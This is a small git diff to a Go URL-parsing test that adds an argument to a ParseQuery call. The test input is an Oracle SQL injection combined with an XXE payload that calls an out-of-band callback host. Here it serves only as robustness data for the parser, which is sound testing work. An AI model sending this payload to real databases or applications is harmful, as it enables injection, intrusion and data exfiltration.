--- a/internal/url/url_test.go
+++ b/internal/url/url_test.go
@@ -9,7 +9,7 @@ import (
 
 func TestUrlPayloads(t *testing.T) {
 	out := `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`
-	q := ParseQuery(out, '&')
+	q := ParseQuery(out, '&', true)
 	if len(q["var"]) == 0 {
 		t.Error("var is empty")
 	}